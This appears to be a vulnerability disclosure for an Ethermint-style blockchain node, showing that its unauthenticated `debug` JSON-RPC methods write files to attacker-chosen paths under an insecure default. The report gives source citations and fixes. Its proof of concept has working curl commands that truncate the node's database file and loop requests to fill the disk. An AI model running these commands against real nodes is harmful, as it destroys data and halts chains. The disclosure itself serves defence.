### Title
Unauthenticated `debug` JSON-RPC Namespace with Insecure-Default `RestrictUserInput=false` Allows Arbitrary Filesystem Writes, Database Corruption, and Node Halt — (`File: rpc/namespaces/ethereum/debug/api.go`, `rpc/namespaces/ethereum/debug/utils.go`, `server/config/config.go`)

---

### Summary

When an operator enables the `debug` JSON-RPC namespace, the file-write debug methods (`debug_writeMemProfile`, `debug_writeBlockProfile`, `debug_writeMutexProfile`, `debug_cpuProfile`, `debug_goTrace`, `debug_blockProfile`, `debug_mutexProfile`) accept a fully attacker-controlled filesystem path and write to it without authentication. The safety guard (`RestrictUserInput`) defaults to `false`, so path validation is entirely skipped. An unauthenticated remote caller can overwrite arbitrary files — including the live application database — corrupting committed state and halting the chain.

---

### Finding Description

The `debug` namespace is registered as `Public: true` with no authentication layer:

```go
// rpc/apis.go:170-175
{
    Namespace: DebugNamespace,
    Version:   apiVersion,
    Service:   debug.NewAPI(ctx, evmBackend),
    Public:    true,
},
``` [1](#0-0) 

The `DefaultJSONRPCConfig` sets `RestrictUserInput` to `false`:

```go
// server/config/config.go:287
RestrictUserInput: false,
``` [2](#0-1) 

The `validatePath` function only enforces path confinement when `RestrictUserInput` is `true`. When it is `false` (the default), any absolute path — including paths outside the node's data directory — is accepted without restriction:

```go
// rpc/namespaces/ethereum/debug/utils.go:68-91
if ctx.Viper.GetBool(srvflags.JSONRPCRestrictUserInput) {
    // ... path confinement checks ...
}
return fp, nil   // ← returns any path when flag is false
``` [3](#0-2) 

`restrictedCreate` uses `os.Create(fp)` (which **truncates** existing files) when not restricted:

```go
// rpc/namespaces/ethereum/debug/utils.go:96-101
func restrictedCreate(ctx *server.Context, fp string) (*os.File, error) {
    if ctx.Viper.GetBool(srvflags.JSONRPCRestrictUserInput) {
        return os.OpenFile(fp, os.O_RDWR|os.O_CREATE|os.O_EXCL, 0o666)
    }
    return os.Create(fp)   // ← truncates any existing file
}
``` [4](#0-3) 

The `writeProfile` helper (called by `WriteBlockProfile`, `WriteMemProfile`, `WriteMutexProfile`) passes the attacker-supplied path directly through this unguarded pipeline:

```go
// rpc/namespaces/ethereum/debug/utils.go:104-123
func writeProfile(name, file string, ctx *server.Context, log log.Logger) error {
    p := pprof.Lookup(name)
    fp, err := validatePath(ctx, file)   // no-op when RestrictUserInput=false
    f, err := restrictedCreate(ctx, fp)  // os.Create → truncates target
    p.WriteTo(f, 0)
    return f.Close()
}
``` [5](#0-4) 

The same unguarded path flows through `StartCPUProfile` / `CpuProfile` and `StartGoTrace` / `GoTrace`: [6](#0-5) [7](#0-6) 

The configuration comment acknowledges the risk but relies on operators to opt in to safety:

```
# RestrictUserInput will restrict some user input to the JSON-RPC debug apis,
# must be set to true if serving debug namespace to the public.
restrict-user-input = false   ← insecure default
``` [8](#0-7) 

---

### Impact Explanation

**Critical — corrupt committed state / halt chain.**

An unauthenticated attacker who can reach the JSON-RPC port (default `0.0.0.0:8545`) on a node with the `debug` namespace enabled can:

1. **Overwrite the live application database**: Calling `debug_writeMemProfile` (or any other profile-write method) with a path such as `~/.ethermintd/data/application.db/CURRENT` causes `os.Create` to truncate that file. The node's KV store becomes unreadable; the next block commit or restart will fail, permanently halting the node.

2. **Fill disk space**: Repeatedly calling any profile-write method with distinct paths creates unbounded files, exhausting disk space and preventing new blocks from being committed.

3. **Goroutine exhaustion via long sleep**: `BlockProfile`, `CpuProfile`, `GoTrace`, and `MutexProfile` call `time.Sleep(d)` where `d` is attacker-controlled. `parseDuration` permits values up to ~292 years (`uint(time.Duration(1<<63-1)/time.Second)`). Flooding the server with such calls exhausts the goroutine pool. [9](#0-8) 

---

### Likelihood Explanation

**High.** The `debug` namespace is routinely enabled by operators for tracing and profiling (`debug_traceTransaction`, `debug_traceBlockByNumber`, etc.). The JSON-RPC server binds to `0.0.0.0:8545` by default, making it reachable from the network. `RestrictUserInput` defaults to `false` and the only protection is an opt-in comment in the config template. No authentication, rate limiting, or IP allowlist is applied to the debug namespace. The attack requires a single unauthenticated JSON-RPC call.

---

### Recommendation

1. **Flip the default**: Change `RestrictUserInput` to `true` in `DefaultJSONRPCConfig()`. The current default is insecure; operators who need unrestricted paths can explicitly opt out. [2](#0-1) 

2. **Enforce restriction when `debug` namespace is active**: In `StartJSONRPC` or `GetConfig`, if `debug` is in the enabled API list and `RestrictUserInput=false`, either reject the configuration or force `RestrictUserInput=true` with a warning.

3. **Remove or gate the file-write methods behind an explicit flag**: Methods like `WriteMemProfile`, `WriteBlockProfile`, `WriteMutexProfile`, `CpuProfile`, `GoTrace`, `BlockProfile`, and `MutexProfile` write to disk and should require an additional explicit opt-in flag separate from enabling the `debug` namespace for tracing.

4. **Cap `nsec` in `parseDuration`**: Impose a reasonable maximum (e.g., 300 seconds) to prevent goroutine exhaustion via long-sleep calls. [10](#0-9) 

---

### Proof of Concept

**Precondition**: Node started with `json-rpc.api = "eth,net,web3,debug"` (common for debugging nodes). `RestrictUserInput` is not set (defaults to `false`). JSON-RPC is reachable on port 8545.

**Step 1 — Corrupt the application database:**
```bash
# Truncates ~/.ethermintd/data/application.db/CURRENT to a heap-profile dump,
# making the database unreadable.
curl -X POST http://<node>:8545 \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","method":"debug_writeMemProfile",
       "params":["/home/user/.ethermintd/data/application.db/CURRENT"],
       "id":1}'
```

**Step 2 — Verify node halt:**
```bash
# Node fails to open the corrupted database on next restart or block commit.
ethermintd start
# PANIC: failed to load latest version: ...
```

**Step 3 — Disk exhaustion (alternative):**
```bash
for i in $(seq 1 10000); do
  curl -s -X POST http://<node>:8545 \
    -H "Content-Type: application/json" \
    -d "{\"jsonrpc\":\"2.0\",\"method\":\"debug_writeMemProfile\",
         \"params\":[\"/tmp/fill_$i\"],\"id\":$i}" &
done
```

Each call writes a heap profile snapshot to a new file, filling disk until the node can no longer commit blocks.

### Citations

**File:** rpc/apis.go (L170-175)
```go
				{
					Namespace: DebugNamespace,
					Version:   apiVersion,
					Service:   debug.NewAPI(ctx, evmBackend),
					Public:    true,
				},
```

**File:** server/config/config.go (L287-287)
```go
		RestrictUserInput:        false,
```

**File:** rpc/namespaces/ethereum/debug/utils.go (L68-91)
```go
	if ctx.Viper.GetBool(srvflags.JSONRPCRestrictUserInput) {
		absDataDir, err := filepath.Abs(ctx.Config.RootDir)
		if err != nil {
			return "", err
		}
		realDataDir, err := filepath.EvalSymlinks(absDataDir)
		if err != nil {
			return "", err
		}
		// Resolve parent dir symlinks; the file itself may not exist yet.
		realParent, err := filepath.EvalSymlinks(filepath.Dir(fp))
		if err != nil {
			return "", err
		}
		fp = filepath.Join(realParent, filepath.Base(fp))
		if !strings.HasPrefix(fp, realDataDir+string(filepath.Separator)) {
			return "", errors.New("file path must be in the data directory")
		}
		// Reject a pre-existing symlink at the final component.
		if fi, err := os.Lstat(fp); err == nil && fi.Mode()&os.ModeSymlink != 0 {
			return "", errors.New("file path must not be a symlink")
		}
	}
	return fp, nil
```

**File:** rpc/namespaces/ethereum/debug/utils.go (L96-101)
```go
func restrictedCreate(ctx *server.Context, fp string) (*os.File, error) {
	if ctx.Viper.GetBool(srvflags.JSONRPCRestrictUserInput) {
		return os.OpenFile(fp, os.O_RDWR|os.O_CREATE|os.O_EXCL, 0o666)
	}
	return os.Create(fp)
}
```

**File:** rpc/namespaces/ethereum/debug/utils.go (L104-123)
```go
func writeProfile(name, file string, ctx *server.Context, log log.Logger) error {
	p := pprof.Lookup(name)
	log.Info("Writing profile records", "count", p.Count(), "type", name, "dump", file)
	fp, err := validatePath(ctx, file)
	if err != nil {
		return err
	}
	f, err := restrictedCreate(ctx, fp)
	if err != nil {
		return err
	}

	if err := p.WriteTo(f, 0); err != nil {
		if err := f.Close(); err != nil {
			return err
		}
		return err
	}

	return f.Close()
```

**File:** rpc/namespaces/ethereum/debug/api.go (L153-158)
```go
func parseDuration(nsec uint) (time.Duration, error) {
	if nsec > uint(time.Duration(1<<63-1)/time.Second) {
		return time.Duration(0), fmt.Errorf("value %d exceeds maximum duration for time.Duration", nsec)
	}
	return time.Duration(nsec) * time.Second, nil
}
```

**File:** rpc/namespaces/ethereum/debug/api.go (L163-174)
```go
func (a *API) BlockProfile(file string, nsec uint) error {
	d, err := parseDuration(nsec)
	if err != nil {
		return err
	}
	a.logger.Debug("debug_blockProfile", "file", file, "nsec", nsec)
	runtime.SetBlockProfileRate(1)
	defer runtime.SetBlockProfileRate(0)

	time.Sleep(d)
	return writeProfile("block", file, a.ctx, a.logger)
}
```

**File:** rpc/namespaces/ethereum/debug/api.go (L241-278)
```go
func (a *API) StartCPUProfile(file string) error {
	a.logger.Debug("debug_startCPUProfile", "file", file)
	a.handler.mu.Lock()
	defer a.handler.mu.Unlock()

	switch {
	case isCPUProfileConfigurationActivated(a.ctx):
		a.logger.Debug("CPU profiling already in progress using the configuration file")
		return errors.New("CPU profiling already in progress using the configuration file")
	case a.handler.cpuFile != nil:
		a.logger.Debug("CPU profiling already in progress")
		return errors.New("CPU profiling already in progress")
	default:
		fp, err := validatePath(a.ctx, file)
		if err != nil {
			a.logger.Debug("failed to get filepath for the CPU profile file", "error", err.Error())
			return err
		}
		f, err := restrictedCreate(a.ctx, fp)
		if err != nil {
			a.logger.Debug("failed to create CPU profile file", "error", err.Error())
			return err
		}
		if err := pprof.StartCPUProfile(f); err != nil {
			a.logger.Debug("cpu profiling already in use", "error", err.Error())
			if err := f.Close(); err != nil {
				a.logger.Debug("failed to close cpu profile file")
				return stderrors.Wrap(err, "failed to close cpu profile file")
			}
			return err
		}

		a.logger.Info("CPU profiling started", "profile", file)
		a.handler.cpuFile = f
		a.handler.cpuFilename = file
		return nil
	}
}
```

**File:** rpc/namespaces/ethereum/debug/trace.go (L27-59)
```go
func (a *API) StartGoTrace(file string) error {
	a.logger.Debug("debug_startGoTrace", "file", file)
	a.handler.mu.Lock()
	defer a.handler.mu.Unlock()

	if a.handler.traceFile != nil {
		a.logger.Debug("trace already in progress")
		return errors.New("trace already in progress")
	}

	fp, err := validatePath(a.ctx, file)
	if err != nil {
		a.logger.Debug("failed to validate trace file path", "error", err.Error())
		return err
	}

	f, err := restrictedCreate(a.ctx, fp)
	if err != nil {
		a.logger.Debug("failed to create go trace file", "error", err.Error())
		return err
	}
	if err := trace.Start(f); err != nil {
		a.logger.Debug("Go tracing already started", "error", err.Error())
		if err := f.Close(); err != nil {
			a.logger.Debug("failed to close trace file")
			return stderrors.Wrap(err, "failed to close trace file")
		}
		return err
	}
	a.handler.traceFile = f
	a.handler.traceFilename = file
	a.logger.Info("Go tracing started", "dump", a.handler.traceFilename)
	return nil
```

**File:** server/config/toml.go (L119-121)
```go
# RestrictUserInput will restrict some user input to the JSON-RPC debug apis,
# must be set to true if serving debug namespace to the public.
restrict-user-input = {{ .JSONRPC.RestrictUserInput }}
```
